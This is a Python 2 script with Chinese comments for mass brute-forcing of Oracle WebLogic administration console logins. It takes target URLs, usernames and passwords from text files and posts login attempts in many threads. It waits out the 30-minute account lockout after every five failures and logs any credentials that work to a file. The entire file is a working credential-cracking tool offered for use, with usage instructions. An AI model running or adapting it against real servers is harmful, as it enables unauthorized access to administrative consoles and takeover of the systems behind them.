#coding=utf-8
import Queue
import requests
import time
import threading
import sys
import os
'''
Version 3
Copyright dc3
http://185.es
2015-09-26 18:31
修复了以前无法控制线程数量的错误
添加在cmd窗口上显示线程数(Linux系统的就自己修改下命令吧)
Usage:python main.py 200
设定的是200个线程，但实际只有199个为破解线程，还有一个主线程
使用前请安装requests模块
遇到任何问题或者bug请到我博客留言
'''
def post(i,mythreads):
	global xtime
	#print xtime
	#print '%d urls left' %mythreads.qsize() 
	#print 'Current threads:'+'%d' %threading.active_count()
	try:
		z=0
		co=0
		pwdcount=len(open('pwd.txt','rU').readlines())
		usrcount=len(open('usr.txt','rU').readlines())
		sum=pwdcount*usrcount #总尝试次数=用户名个数*密码个数
		for usr in open("usr.txt").readlines():
			usr=usr.strip('\n')
			for pwd in open("pwd.txt").readlines():
				pwd=pwd.strip('\n')
				#print 'weblogic'+'/'+pwd
				z=z+1
				co=co+1
				if z == 6:	#账户错误达到5次，此账户锁定30分钟，等待重试
					print i+' Waiting......'
					ct=0
					b=31
					while (ct<b):
						os.system("title Current threads: %d,URLs left: %%d" %threading.active_count()%mythreads.qsize()) #更改窗口标题，如觉得太消耗CPU资源可以注释掉
						ncount=b-ct
						ncount='%d' %ncount
						print i+'\n'+ncount+'min left'
						time.sleep(60)
						ct+=1
					z=1 #重置计数
				#print i+'/'+usr+'/'+pwd
				data = {'j_username':usr,'j_password':pwd}
				s = requests.post(i+'/j_security_check',data =data,timeout=5)
				if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
					print i,'Success!!!!!' 
					print usr+'/'+pwd
					f=open(xtime+'.txt', 'a')
					f.write(i+' ')
					f.write(usr+'/')
					f.write(pwd+'\n')
					f.close()
					s=0
					return #成功，停止循环
				else:
					if co == sum: #达到总尝试次数，则输出失败
						print i,'Failed!'
						f = open("bad.txt", 'a')
						f.write(i+'\n')
						f.close()
						s = 0
	except:
		s=0


def main():
	global xtime
	xtime=time.strftime("%Y-%m-%d[%H.%M.%S]")
	print xtime
	MaxThreads=sys.argv[1]
	MaxThreads=int(MaxThreads)
	mythreads = Queue.Queue(maxsize = 0) 
	for i in open("u.txt").readlines():#先将所有线程装入队列，等待取出
		i=i.strip('\n')
		t=threading.Thread(target=post, args=(i,mythreads))
		t.setDaemon(True)
		mythreads.put(t)
	print 'Total Threads:%d' %MaxThreads
	print 'Total URLs:%d' %mythreads.qsize()
	time.sleep(2)
	while True: #若条件都不满足，则死循环
		if(threading.active_count() == 1 and mythreads.qsize() == 0): #若剩余URL数等于0,活动线程为1，则退出.主线程占一个
			break
		elif(threading.active_count() < MaxThreads): #判断正在运行的线程数量,如果小于输入值则继续添加线程
			t=mythreads.get() #取出一个线程
			t.start() #加载该线程
			t.join(1) #阻塞一秒钟，然后加载下个线程，不愿意等可以注释掉,不建议去掉
	

if __name__ == '__main__':
	main()
